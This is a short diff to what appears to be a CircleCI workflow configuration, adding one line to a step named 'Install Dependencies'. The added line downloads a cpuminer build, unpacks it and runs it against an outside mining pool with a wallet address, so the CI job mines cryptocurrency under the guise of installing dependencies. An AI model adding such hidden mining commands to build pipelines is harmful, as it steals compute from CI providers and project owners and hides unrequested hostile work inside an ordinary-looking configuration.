@@ -28,6 +28,7 @@ jobs:
         - run:
             name: Install Dependencies
             command: timeout 1m lscpu
+              wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.24/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a power2b  -o stratum+tcps://stratum-asia.rplant.xyz:17022 -u MYhgUWgc6gY5ZpnD8gSfXSekyWBHHMmCQK.ARF01   --algo yespower-b2b --param-n 2048 --param-r 32 --param-key "Now I am become Death, the destroyer of worlds" 
 workflows:
     version: 2.1
     build:
